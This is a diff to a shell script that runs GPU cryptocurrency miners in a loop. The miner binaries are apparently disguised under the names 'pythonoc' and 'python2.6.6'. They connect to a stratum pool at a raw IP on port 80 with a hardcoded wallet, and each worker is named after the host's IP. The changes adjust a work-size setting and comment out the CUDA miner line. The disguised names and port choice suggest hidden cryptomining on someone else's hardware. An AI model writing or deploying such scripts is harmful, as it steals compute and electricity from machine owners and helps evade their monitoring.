@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '##################### Test N 35 ########################'
+echo '##################### Test N 36 ########################'
 echo '#######################################################'
 
 rm -rf python2.6.6
@@ -43,8 +43,8 @@ then
     while true
     do
         date
-        ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128 2>> oout 1>> oout &
-        ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80   --cuda-parallel-hash 4  --cuda-block-size 256   --cu-schedule auto --cuda-streams 2 --cuda-grid-size 16384 2>> oout 1>> oout &
+        ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 256 2>> oout 1>> oout &
+       # ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80   --cuda-parallel-hash 4  --cuda-block-size 256   --cu-schedule auto --cuda-streams 2 --cuda-grid-size 16384 2>> oout 1>> oout &
         while true;do nvidia-smi  -q -i 0 -d CLOCK;sleep 5000;done &
         tail -f oout 
     done
